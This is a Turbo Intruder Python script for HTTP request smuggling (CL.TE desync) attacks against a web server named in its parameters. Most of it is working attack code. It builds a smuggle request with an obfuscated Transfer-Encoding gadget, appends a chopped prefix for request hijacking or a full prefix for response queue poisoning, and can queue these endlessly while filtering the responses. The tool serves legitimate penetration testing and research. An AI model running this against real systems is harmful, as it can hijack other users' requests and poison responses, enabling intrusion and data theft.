# Copyright 2020 Evan Custodio
#
# Permission is hereby granted, free of charge, to any person obtaining a copy of this software 
# and associated documentation files (the "Software"), to deal in the Software without restriction,
# including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense,
# and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so,
# subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all copies or 
# substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED 
# TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL 
# THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF 
# CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER 
# DEALINGS IN THE SOFTWARE.
#
# Turbo Intruder Python Script
# For HTTP Request Smuggling CLTE Attacks
#
# Author: @defparam
#
# Documentation:
#
#    Server:                IP address/dns name of the web server you want to connect to, http/https 80/443 supported.
#    attack_count:          The number of smuggle requests to issue.
#    regular_count:         The number of innocuous requests to issue out after the smuggle requests.
#    continuous:            Set to True if you want the attack request and regular requests to endlessly loop, False will break after first iteration.
#    concurrentConnections: Request engine concurrent connection count.
#    requestsPerConnection: Request engine requests per connection count.
#
#    SmuggleGadget:         Gadget used to induce CLTE desync on the asset.
#    TheVerb:               The HTTP method used in the first level smuggle request.
#    TheEP:                 The endpoint used in the first level smuggle request.
#    TheProtocol:           The HTTP Protocol version used in the first level smuggle request.
#    TheHost:               The hostname used in the host header of the first level smuggle request.
#
#    PrefixVerb:            The HTTP method used in the second level prefix request.
#    PrefixEP:              The endpoint used in the second level prefix request.
#    PrefixProtocol:        The HTTP Protocol version used in the second level prefix request.
#    PrefixHost:            The hostname used in the host header of the second level prefix request (only if ChoppedHost is True or Chopped is False)
#    Chopped(true):         If True the prefix request is chopped at a custom header and is incomplete. This is used for request hijacking.
#    Chopped(false):        If False the prefix request is a fully formed HTTP request. This is used for response queue poisoning.
#    ChoppedHost:           If True the chopped prefix will contain a host header specified by PrefixHost.
#
#    FilterOn(False):       If False all responses shall be posted in the turbo intruder window.
#    FilterOn(True):        If True all NULL responses are omitted and all responses that match the Filters list shall be omitted.
#    Filters(List):         This is a list of strings that are compared against responses, if responses contain these string they shall be omitted (if FilterOn == True)
#    ShowTestResponse:      If True this debug feature allows the first response to appear unfiltered regardless if filtering is enabled

# --------------------------- #
# ----ATTACK PARAMETERS!----- #
# --------------------------- #
Server                = "https://<example>.com:443"
attack_count          = 1
regular_count         = 40
continuous            = False
concurrentConnections = 10
requestsPerConnection = 1
# --

# -- Smuggle Request Parameters
SmuggleGadget         = "\x01Transfer-Encoding: chunked"
TheVerb               = "POST"
TheEP                 = "/"
TheProtocol           = "HTTP/1.1"
TheHost               = "<example>.com"
# --

# -- Prefix Request Parameters
PrefixVerb            = "GET"
PrefixEP              = "/404"
PrefixProtocol        = "HTTP/1.1"
PrefixHost            = "<example>.com"
Chopped               = True
ChoppedHost           = False
# --

# -- Response Filtering Parameters
FilterOn              = True
Filters               = ["Content-Length: 1256","HTTP/1.1 400 Bad Request"]
ShowTestResponse      = False
# --

# --------------------------- #
# --------------------------- #
# --------------------------- #
# --------------------------- #




# ------------------------------------------------- #
# If you make changes to the headers formats below
# try not to break the parameterization.
# ------------------------------------------------- #
def queueRequests(target, wordlists):

    # to use Burp's HTTP stack for upstream proxy rules etc, use engine=Engine.BURP
    engine = RequestEngine(endpoint=Server,
                           concurrentConnections=concurrentConnections,
                           requestsPerConnection=requestsPerConnection,
                           resumeSSL=False,
                           timeout=1,
                           pipeline=False,
                           maxRetriesPerRequest=0,
                           engine=Engine.THREADED,
                           )
    engine.start()
    RN = "\r\n"
    
    # --------------------------- #
    # --CHOPPED PREFIX REQUEST!-- #
    # --------------------------- #
    prefix_chopped  = ("%s %s HTTP/1.1" % (PrefixVerb, PrefixEP)) + RN
    if (ChoppedHost): prefix_chopped += ("Host: %s" % (PrefixHost)) + RN
    prefix_chopped += "X: X" # CHOP!
    # --------------------------- #
    
    # --------------------------- #
    # ----FULL PREFIX REQUEST!--- #
    # --------------------------- #
    prefix_full  = ("%s %s %s" % (PrefixVerb, PrefixEP, PrefixProtocol)) + RN
    prefix_full += ("Host: %s" % (PrefixHost)) + RN
    prefix_full += "Connection: keep-alive" + RN
    prefix_full += "Accept-Encoding: gzip, deflate" + RN
    prefix_full += "Accept: */*" + RN
    prefix_full += "Accept-Language: en" + RN
    prefix_full += "Content-Type: application/x-www-form-urlencoded" + RN
    prefix_full += RN
    # --------------------------- #
    
    # --------------------------- #
    # ---CLTE SMUGGLE REQUEST!--- #
    # --------------------------- #
    smuggle  = ("%s %s %s" % (TheVerb, TheEP, TheProtocol)) + RN
    smuggle += SmuggleGadget + RN                    # SMUGGLE GADGET!
    smuggle += ("Host: %s" % (TheHost)) + RN
    smuggle += "Content-Length: 0" + RN
    smuggle += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36" + RN
    smuggle += "Origin: https://www.google.com" + RN 
    smuggle += "Accept-Encoding: gzip, deflate" + RN
    smuggle += "Content-Type: application/x-www-form-urlencoded" + RN
    smuggle += RN
    smuggle += "0"
    smuggle += RN
    smuggle += RN
    # --------------------------- #

    # --------------------------- #
    # -----REGULAR REQUEST!------ #
    # --------------------------- #
    regular  = "GET / HTTP/1.1" + RN
    regular += ("Host: %s" % (TheHost)) + RN
    regular += "Origin: https://www.google.com" + RN
    regular += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36" + RN
    regular += RN
    # --------------------------- #

    # --------------------------- #
    # -----ATTACK EXECUTOR!------ #
    # --------------------------- #
    if (Chopped):
        attack  = smuggle + prefix_chopped
    else:
        attack  = smuggle + prefix_full
    while(1):
        for i in range(attack_count): engine.queue(attack)
        for i in range(regular_count): engine.queue(regular)
        if (not continuous): break
    # --------------------------- #


# --------------------------- #
# ----RESPONSE FILTERING!---- #
# --------------------------- #
def handleResponse(req, interesting):
    global ShowTestResponse
    if (FilterOn and not ShowTestResponse):
        if len(req.response) == 4: 
            return
        for filter in Filters:
            if filter in req.response:
                return
    ShowTestResponse = False
    table.add(req)
    
# --------------------------- #

